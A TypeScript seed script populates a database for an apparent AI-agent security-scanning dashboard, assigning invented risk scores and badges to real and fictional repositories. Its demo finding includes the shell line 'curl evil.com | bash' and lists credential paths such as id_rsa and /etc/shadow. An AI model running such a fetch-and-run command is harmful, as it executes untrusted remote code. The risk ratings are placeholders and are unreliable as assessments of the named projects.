import dotenv from "dotenv";
dotenv.config({ path: ".env.local" });

const DEMO_SKILLS = [
    {
        owner: "langchain-ai",
        repo: "langchain",
        risk: "low",
        score: 10, // Static Risk Score (Low Risk = Low Score) -> Displayed as 90 Safety
        badge: "silver",
        desc: "Building applications with LLMs through composability."
    },
    {
        owner: "yoheinakajima",
        repo: "babyagi",
        risk: "critical",
        score: 95, // Static Risk Score (High Risk = High Score) -> Displayed as 5 Safety
        badge: "none",
        desc: "AI-powered task management system."
    },
    {
        owner: "AutoGPT",
        repo: "AutoGPT",
        risk: "medium",
        score: 45,
        badge: "bronze",
        desc: "An experimental open-source attempt to make GPT-4 fully autonomous."
    },
    {
        owner: "evil-agent-org",
        repo: "data-exfiltrator",
        risk: "high",
        score: 95,
        badge: "none",
        desc: "A suspicious agent that pipes shell output to external servers."
    },
    {
        owner: "antigravity-official",
        repo: "secure-tool-pack",
        risk: "low",
        score: 5,
        badge: "pinned",
        desc: "Official secure toolset for Antigravity agents."
    },
    {
        owner: "openai",
        repo: "swarm",
        risk: "low",
        score: 15,
        badge: "silver",
        desc: "Educational framework exploring ergonomic, lightweight multi-agent orchestration."
    },
    {
        owner: "microsoft",
        repo: "autogen",
        risk: "medium",
        score: 45,
        badge: "bronze",
        desc: "A framework that enables the development of LLM applications using multiple agents."
    },
    {
        owner: "run-llama",
        repo: "llama_index",
        risk: "low",
        score: 12,
        badge: "silver",
        desc: "Data framework for your LLM applications."
    },
    {
        owner: "Significant-Gravitas",
        repo: "AutoGPT",
        risk: "medium",
        score: 55,
        badge: "none",
        desc: "AutoGPT is the vision of accessible AI for everyone, to use and to build on."
    }
];

// Generate just a few filler items to make the grid look full, but acceptable
for (let i = 1; i <= 6; i++) {
    DEMO_SKILLS.push({
        owner: `community-dev-${i}`,
        repo: `agent-plugin-${i}`,
        risk: "low",
        score: 10 + i,
        badge: "bronze",
        desc: `Community submitted agent plugin for extended capabilities #${i}.`
    });
}

async function seed() {
    console.log("🌱 Seeding database...");

    // Dynamic import to ensure dotenv loads first
    const { supabaseAdmin } = await import("./lib/supabase");

    for (const item of DEMO_SKILLS) {
        const slug = `${item.owner}/${item.repo}`.toLowerCase();

        // 1. Create Skill
        const { data: skill, error: skillError } = await (supabaseAdmin
            .from("skills") as any)
            .upsert({
                name: item.repo,
                slug: slug,
                source_url: `https://github.com/${item.owner}/${item.repo}`,
                source_type: "github"
            }, { onConflict: "slug" })
            .select()
            .single();

        if (skillError) {
            console.error(`Error creating skill ${slug}:`, skillError.message);
            continue;
        }

        // 2. Create Scan
        const { error: scanError } = await (supabaseAdmin
            .from("scans") as any)
            .insert({
                skill_id: skill.id,
                status: "done",
                risk_level: item.risk,
                verified_badge: item.badge,
                static_json: {
                    static_score: item.score,
                    capabilities: ["network", "filesystem"],
                    sensitive_paths: item.risk === "high" ? [".env", "id_rsa"] : []
                },
                deep_json: {
                    summary: `Automated audit for ${item.repo}. ${item.desc}`,
                    risk_level: item.risk,
                    findings: item.risk === "high" ? [
                        {
                            title: "Critical: Shell Pipe Detected",
                            severity: "critical",
                            why_it_matters: "Piping curl to bash is extremely dangerous.",
                            evidence: [{ snippet: "curl evil.com | bash", source: "install.sh" }],
                            recommended_fix: "Remove this line."
                        }
                    ] : [],
                    attack_chain: [],
                    verification_plan: {
                        preflight_checks: ["Check env vars"],
                        runtime_checks: ["Monitor network"],
                        postrun_checks: ["Verify logs"]
                    },
                    policy_suggestions: {
                        allow_domains: ["github.com"],
                        deny_paths: ["/etc/shadow"],
                        tool_restrictions: []
                    },
                    token_usage: {
                        prompt: 15000,
                        response: 4000,
                        total: 19000
                    }
                }
            });

        if (scanError) {
            console.error(`Error creating scan for ${slug}:`, scanError.message);
        } else {
            console.log(`✅ Seeded ${slug}`);
        }
    }
}

seed();
